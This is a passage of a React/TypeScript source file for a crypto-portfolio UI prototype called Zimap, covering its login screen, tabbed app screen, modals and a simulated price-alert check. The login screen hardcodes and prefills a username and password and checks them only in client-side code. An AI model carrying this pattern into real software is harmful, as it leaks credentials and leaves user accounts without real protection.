          { label: 'Currency', value: 'USD ($)' },
        ].map((item, i) => (
          <div key={i} className="bg-white p-5 rounded-2xl flex items-center justify-between shadow-sm border border-black/5">
            <span className="text-gray-400 font-bold text-sm uppercase tracking-wider">{item.label}</span>
            <span className="font-bold text-[#1a1a2e]">{item.value}</span>
          </div>
        ))}
      </div>

      <button 
        onClick={onSignOut}
        className="w-full py-4 bg-red-50 text-red-600 rounded-2xl font-bold active:scale-95 transition-all"
      >
        Sign Out
      </button>
    </div>
  );
};

const LoginScreen = ({ onLogin }: { onLogin: (user: string) => void }) => {
  const [username, setUsername] = useState('project_manager');
  const [password, setPassword] = useState('San2008@');

  const handleSignIn = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === 'project_manager' && password === 'San2008@') {
      onLogin(username);
    } else if (!username || !password) {
      alert('Please enter both username and password');
    } else {
      alert('Invalid username or password. Use the default credentials.');
    }
  };

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center p-6 overflow-hidden">
      {/* Decorative Elements */}
      <div className="absolute top-[-10%] left-[-10%] w-64 h-64 bg-[#e8c94a]/10 rounded-full blur-3xl" />
      <div className="absolute bottom-[-10%] right-[-10%] w-80 h-80 bg-[#1a1a2e]/5 rounded-full blur-3xl" />
      <div className="absolute top-20 right-10 w-12 h-12 border-2 border-[#e8c94a]/20 rotate-45" />
      <div className="absolute bottom-40 left-10 w-8 h-8 border-2 border-[#1a1a2e]/10 rounded-sm" />

      <div className="z-10 w-full max-w-sm">
        <div className="text-center mb-10">
          <h1 className="text-5xl font-bold tracking-tighter text-[#1a1a2e]">
            Zim<span className="text-[#e8c94a]">ap</span>
          </h1>
          <p className="text-[#9ca3af] mt-2 font-medium">Your crypto portfolio, simplified</p>
        </div>

        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-white p-8 rounded-[28px] shadow-xl shadow-black/5 border border-white"
        >
          <form onSubmit={handleSignIn} className="space-y-6">
            <div>
              <label className="block text-xs font-bold uppercase tracking-wider text-[#9ca3af] mb-2 ml-1">Username</label>
              <input 
                type="text" 
                placeholder="Enter username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-5 py-4 bg-[#f8f8f4] border-2 border-transparent focus:border-[#e8c94a] rounded-2xl outline-none transition-all duration-300 font-medium"
              />
            </div>
            <div>
              <label className="block text-xs font-bold uppercase tracking-wider text-[#9ca3af] mb-2 ml-1">Password</label>
              <input 
                type="password" 
                placeholder="Enter password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-5 py-4 bg-[#f8f8f4] border-2 border-transparent focus:border-[#e8c94a] rounded-2xl outline-none transition-all duration-300 font-medium"
              />
            </div>
            <button 
              type="submit"
              className="w-full py-4 bg-[#1a1a2e] text-white rounded-2xl font-bold text-lg shadow-lg shadow-[#1a1a2e]/20 active:scale-[0.98] transition-all"
            >
              Sign In
            </button>
          </form>
        </motion.div>

        <p className="text-center mt-8 text-xs font-bold tracking-widest text-[#9ca3af] uppercase">
          UI Prototype — Not a Financial Service
        </p>
      </div>
    </div>
  );
};

const AppScreen = ({ username, onSignOut }: { username: string, onSignOut: () => void }) => {
  const [activeTab, setActiveTab] = useState<Tab>('home');
  const [modals, setModals] = useState({
    withdraw: false,
    send: false,
    receive: false,
    alerts: false,
    swap: false
  });
  const [notification, setNotification] = useState<{ message: string, type: 'success' | 'alert' } | null>(null);

  const notify = (message: string, type: 'success' | 'alert') => {
    setNotification({ message, type });
  };

  const handleAction = (action: string) => {
    switch(action) {
      case 'send': setModals(prev => ({ ...prev, send: true })); break;
      case 'receive': setModals(prev => ({ ...prev, receive: true })); break;
      case 'withdraw': setModals(prev => ({ ...prev, withdraw: true })); break;
      case 'alerts': setModals(prev => ({ ...prev, alerts: true })); break;
      case 'deposit': setModals(prev => ({ ...prev, swap: true })); break;
      case 'markets': setActiveTab('markets'); break;
      case 'earn': notify('Earn feature coming soon', 'alert'); break;
      default: notify('Feature coming soon', 'alert');
    }
  };

  // Check alerts every 10 seconds (simulated)
  useEffect(() => {
    const interval = setInterval(() => {
      const saved = localStorage.getItem('zimap_alerts');
      if (!saved) return;
      const alerts: PriceAlert[] = JSON.parse(saved);
      
      alerts.forEach(alert => {
        if (!alert.active) return;
        const asset = TRENDING_ASSETS.find(a => a.id === alert.assetId);
        if (!asset) return;

        const triggered = alert.condition === 'above' 
          ? asset.price >= alert.targetPrice 
          : asset.price <= alert.targetPrice;

        if (triggered) {
          notify(`ALERT: ${asset.name} is now ${alert.condition} $${alert.targetPrice}`, 'alert');
          // Deactivate alert after trigger
          const updated = alerts.map(a => a.id === alert.id ? { ...a, active: false } : a);
          localStorage.setItem('zimap_alerts', JSON.stringify(updated));
        }
      });
    }, 10000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen flex flex-col max-w-md mx-auto bg-[#f0f0e8] relative">
      <main className="flex-1 p-6 overflow-y-auto no-scrollbar">
        <AnimatePresence mode="wait">
          <motion.div
            key={activeTab}
            initial={{ opacity: 0, x: 10 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -10 }}
            transition={{ duration: 0.2 }}
          >
            {activeTab === 'home' && <HomeTab username={username} onAction={handleAction} />}
            {activeTab === 'wallet' && <WalletTab onAction={handleAction} />}
            {activeTab === 'markets' && <MarketsTab />}
            {activeTab === 'profile' && <ProfileTab username={username} onSignOut={onSignOut} />}
          </motion.div>
        </AnimatePresence>
      </main>

      {/* Bottom Navigation */}
      <nav className="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-white/80 backdrop-blur-xl border-t border-black/5 px-8 py-4 flex justify-between items-center z-40">
        {[
          { id: 'home', icon: <Home className="w-6 h-6" />, label: 'Home' },
          { id: 'wallet', icon: <Wallet className="w-6 h-6" />, label: 'Wallet' },
          { id: 'markets', icon: <PieChart className="w-6 h-6" />, label: 'Markets' },
          { id: 'profile', icon: <User className="w-6 h-6" />, label: 'Profile' },
        ].map((tab) => (
          <button 
            key={tab.id}
            onClick={() => setActiveTab(tab.id as Tab)}
            className={`flex flex-col items-center gap-1 transition-all ${activeTab === tab.id ? 'text-[#1a1a2e]' : 'text-gray-300'}`}
          >
            {tab.icon}
            <span className="text-[10px] font-bold uppercase tracking-widest">{tab.label}</span>
            {activeTab === tab.id && (
              <motion.div layoutId="activeDot" className="w-1 h-1 bg-[#e8c94a] rounded-full mt-0.5" />
            )}
          </button>
        ))}
      </nav>

      <AnimatePresence>
        {notification && (
          <Notification 
            message={notification.message} 
            type={notification.type} 
            onClose={() => setNotification(null)} 
          />
        )}
      </AnimatePresence>

      <WithdrawModal isOpen={modals.withdraw} onClose={() => setModals(p => ({ ...p, withdraw: false }))} onNotify={notify} />
      <SwapModal isOpen={modals.swap} onClose={() => setModals(p => ({ ...p, swap: false }))} onNotify={notify} />
      <SendModal isOpen={modals.send} onClose={() => setModals(p => ({ ...p, send: false }))} onNotify={notify} />
      <ReceiveModal isOpen={modals.receive} onClose={() => setModals(p => ({ ...p, receive: false }))} onNotify={notify} />
      <AlertsModal isOpen={modals.alerts} onClose={() => setModals(p => ({ ...p, alerts: false }))} onNotify={notify} />
    </div>
  );
};

export default function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('Project Director');

  const handleLogin = (user: string) => {
    setUsername(user);
    setIsLoggedIn(true);
  };

  const handleSignOut = () => {
    setIsLoggedIn(false);
  };

  return (
    <div className="min-h-screen bg-[#f0f0e8]">
      <AnimatePresence mode="wait">
        {!isLoggedIn ? (
          <motion.div
            key="login"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            transition={{ duration: 0.4 }}
          >
            <LoginScreen onLogin={handleLogin} />
          </motion.div>
        ) : (
          <motion.div
            key="app"
            initial={{ opacity: 0, scale: 1.05 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.5, type: 'spring' }}
          >
            <AppScreen username={username} onSignOut={handleSignOut} />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
